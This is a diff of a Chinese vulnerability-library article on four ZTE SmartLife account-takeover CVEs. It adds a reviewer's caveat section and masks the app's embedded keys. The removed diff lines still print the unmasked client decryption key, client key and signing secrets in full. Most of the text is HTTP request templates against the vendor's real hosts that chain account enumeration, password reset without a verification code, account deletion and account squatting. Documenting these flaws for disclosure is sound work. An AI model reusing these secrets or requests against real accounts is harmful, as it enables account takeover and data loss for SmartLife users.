@@ -1,9 +1,59 @@
 ---
 cve: "CVE-2026-86552"
 source: "gelusus/wxvl 公众号漏洞文库"
+id: "vw-d493880cf67bc08c2ed5d573"
+entity_id: "ve-d493880cf67bc08c2ed5d573"
+schema_version: "1"
+title: "中兴 SmartLife 账户流程与客户端密钥问题（四项 CVE，敏感样例已脱敏）"
+product: "ZTE SmartLife Android应用与账户后端"
+record_type: "analysis"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+identifier_role: "primary"
+primary_identifiers: "CVE-2026-86552; CVE-2026-86553; CVE-2026-86554; CVE-2026-86555"
+referenced_identifiers: ""
+prerequisites: "ZTE_SL_V2.8.2_ABROAD及更早，测试2.8.1；2.8.4上架不等于四漏洞后端全部修复，iOS未实证"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E4%B8%AD%E5%85%B4SmartLife/%E4%B8%AD%E5%85%B4SmartLife%E5%AE%89%E5%8D%93%E5%BA%94%E7%94%A8%E7%9A%844%E4%B8%AACVE%E6%BC%8F%E6%B4%9E%E7%9B%B4%E8%87%B3%E8%B4%A6%E6%88%B7%E6%8E%A5%E7%AE%A1.md"
+review_date: "2026-10-02"
+side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
+source_status: "unknown"
 ---
 
-#  中兴SmartLife安卓应用的4个CVE漏洞直至账户接管  
+# 中兴 SmartLife 账户流程与客户端密钥问题（四项 CVE，敏感样例已脱敏）
+
+<!-- article-review:devices:begin -->
+## 技术校订与证据边界（2026-10-02）
+
+- 产品/组件：ZTE SmartLife Android应用与账户后端
+- 本文讨论：CVE-2026-86552/86553/86554/86555
+- 版本、权限与配置前提：ZTE_SL_V2.8.2_ABROAD及更早，测试2.8.1；2.8.4上架不等于四漏洞后端全部修复，iOS未实证
+- 资料类型：四CVE长篇研究及证据分层；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果
+
+### 逐项校订
+
+- 前文多次声明不转载可能仍有效的密钥，4.7却包含完整客户端共享/签名材料及账户重置请求，发布卫生自相矛盾；本审阅不复制这些值
+- 将四漏洞统一归入用户鉴权层，与86555客户端硬编码根因不一致
+- 声称新版本已移除密钥缺少APK差异证据；附录带未转义嵌套引号/注释的JSON应标伪代码
+- 主CVE元数据只列86552，漏另三个主实体
+- 已落实的文本修订：HTTP 报文围栏改为 http；标题与正文证据对齐。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
+- 客户端解密密钥、对称密钥和共享签名材料已逐值保留首尾并用 * 遮罩中段；参数名、派生算法、请求顺序及各 CVE 机制保留。脱敏不证明厂商已轮换这些材料。
+- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
+
+### 操作风险与恢复
+
+- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本
+
+### 待核与来源
+
+- 四CNA描述、原始自有账户测试证据和二进制补丁差异待核；测试环境删除端点不能算第五个生产漏洞
+- 文章自称核验不代表本审阅独立验证；KEV缺席不代表无在野利用
+- 引用图片未查看，截图内容及有效性待核验
+- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
+- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
+<!-- article-review:devices:end -->
+
  Ots安全   2026-09-22 05:14  
   
 **威胁简报**  
@@ -152,7 +202,7 @@ EPSS 方面，86553 为 0.00446，百分位 0.38035，取值日期 2026-09-21，
   
 Bug 1. 通过公共引导程序伪造 SmartLife 应用身份验证  
   
-```
+```http
 POST /api/getUacSignInfo HTTP/1.1
 Host: ossx-smart.ztehome.com.cn:5443
 Content-Type: application/json
@@ -163,55 +213,55 @@ Content-Type: application/json
 }
  
 // Decrypt result.data with static APK key (CVE-2026-86555):
-decrypt(result.data, key="096760a7a99d99d12de9fecbfca568c0")
+decrypt(result.data, key="096**************************8c0")
  
 // Yields recovered UAC context:
-// appClientKey: "djrom(&)(&)MORJD"
-// appUacSec:    "b2cfe28732612cfd81de7a22ace2034317a47eb94683a016a85cc0883597c625"
-// appUacItp:    "271950143414fnu4mb3lxxotfj5mi1tp"
+// appClientKey: "djr**********RJD"
+// appUacSec:    "b2c**********************************************************625"
+// appUacItp:    "271**************************1tp"
  
 derived account headers:
 X-App-Id:    271950143414
 X-Tenant-Id: 10001
-X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
-X-Auth-Value: aes_gcm_encrypt("${appUacSec},271950143414,${appUacItp},${ms}", key="djrom(&)(&)MORJD")
+X-Itp-Value: accessKey=271**************************1tp
+X-Auth-Value: aes_gcm_encrypt("${appUacSec},271950143414,${appUacItp},${ms}", key="djr**********RJD")
 ```  
   
-> 弱点：公开的引导数据加上客户端提供的解密密钥，096760a7a99d99d12de9fecbfca568c0可以获取客户端密钥djrom(&)(&)MORJD和用于对到达帐户后端的请求进行签名的秘密材料（CVE-2026-86555）。  
+> 弱点：公开的引导数据加上客户端提供的解密密钥，096**************************8c0可以获取客户端密钥djr**********RJD和用于对到达帐户后端的请求进行签名的秘密材料（CVE-2026-86555）。  
   
   
 漏洞 2：账户枚举和账户 ID 泄露  
   
-```
+```http
 POST /zte-sec-uac-iportalbff/external/account/verify.serv HTTP/1.1
 Host: zxuacde.smart-zte.com
 X-App-Id: 271950143414
 X-Tenant-Id: 10001
-X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
-X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
+X-Itp-Value: accessKey=271**************************1tp
+X-Auth-Value: <fresh AES-GCM token encrypted with"djr**********RJD">
 X-Lang-Id: en_US
 Content-Type: application/json
  
 {
-  "key": "<aes_gcm_encrypt(email, key="djrom(&)(&)MORJD")>"
+  "key": "<aes_gcm_encrypt(email, key="djr**********RJD")>"
 }
  
 registered   -> code=0000 + accountId
 unregistered -> code=0004
 ```  
   
-> 弱点：目标电子邮件使用恢复的客户端密钥进行加密djrom(&amp;)(&amp;)MORJD。该端点充当注册帐户预言机，并在成功路径中泄露后端帐户标识符（CVE-2026-86554）。  
+> 弱点：目标电子邮件使用恢复的客户端密钥进行加密djr**********RJD。该端点充当注册帐户预言机，并在成功路径中泄露后端帐户标识符（CVE-2026-86554）。  
   
   
 漏洞3：无需验证码即可重置密码  
   
-```
+```http
 POST /zte-sec-uac-iportalbff/external/account/password/reset.serv HTTP/1.1
 Host: zxuacde.smart-zte.com
 X-App-Id: 271950143414
 X-Tenant-Id: 10001
-X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
-X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
+X-Itp-Value: accessKey=271**************************1tp
+X-Auth-Value: <fresh AES-GCM token encrypted with"djr**********RJD">
 X-Lang-Id: en_US
 Content-Type: application/json
  
@@ -227,13 +277,13 @@ Content-Type: application/json
   
 缺陷 4. 在先前运行时选择的路径上，未使用用户令牌删除帐户  
   
-```
+```http
 POST /zte-sec-uac-iportalbff/external/account/delete.serv HTTP/1.1
 Host: uactest.ztems.com
 X-App-Id: 271950143414
 X-Tenant-Id: 10001
-X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
-X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
+X-Itp-Value: accessKey=271**************************1tp
+X-Auth-Value: <fresh AES-GCM token encrypted with"djr**********RJD">
 X-Emp-No: A<target accountId>
 X-Lang-Id: en_US
 Content-Type: application/json
@@ -249,13 +299,13 @@ Content-Type: application/json
   
 漏洞5：任意邮箱预注册/账号抢注  
   
-```
+```http
 POST /zte-sec-uac-iportalbff/external/account/person/signup.serv HTTP/1.1
 Host: zxuacde.smart-zte.com
 X-App-Id: 271950143414
 X-Tenant-Id: 10001
-X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
-X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
+X-Itp-Value: accessKey=271**************************1tp
+X-Auth-Value: <fresh AES-GCM token encrypted with"djr**********RJD">
 X-Lang-Id: en_US
 Content-Type: application/json
  
@@ -272,26 +322,26 @@ Content-Type: application/json
   
 后置条件：使用新密码登录  
   
-```
+```http
 POST /zte-sec-uac-iportalbff/external/auth/login.serv HTTP/1.1
 Host: zxuacde.smart-zte.com
 X-App-Id: 271950143414
 X-Tenant-Id: 10001
-X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
-X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
+X-Itp-Value: accessKey=271**************************1tp
+X-Auth-Value: <fresh AES-GCM token encrypted with"djr**********RJD">
 X-Lang-Id: en_US
 Content-Type: application/json
  
 {
-  "loginName": "<aes_gcm_encrypt(email, key="djrom(&)(&)MORJD")>",
-  "passWord": "<aes_gcm_encrypt(newPassword, key="djrom(&)(&)MORJD")>",
+  "loginName": "<aes_gcm_encrypt(email, key="djr**********RJD")>",
+  "passWord": "<aes_gcm_encrypt(newPassword, key="djr**********RJD")>",
   "loginSystemCode":"271950143414",
   "loginClientIp":"127.0.0.1",
   "verifyCode":"<sha256_hex(loginName + passWord + ip + systemCode)>"
 }
 ```  
   
-> 证明：使用攻击者设置的密码（经过加密）djrom(&amp;)(&amp;)MORJD和相应的 verifyCode 哈希值，登录会返回证明帐户的有效会话令牌。  
+> 证明：使用攻击者设置的密码（经过加密）djr**********RJD和相应的 verifyCode 哈希值，登录会返回证明帐户的有效会话令牌。  
   
 ## 五、结束语  
   
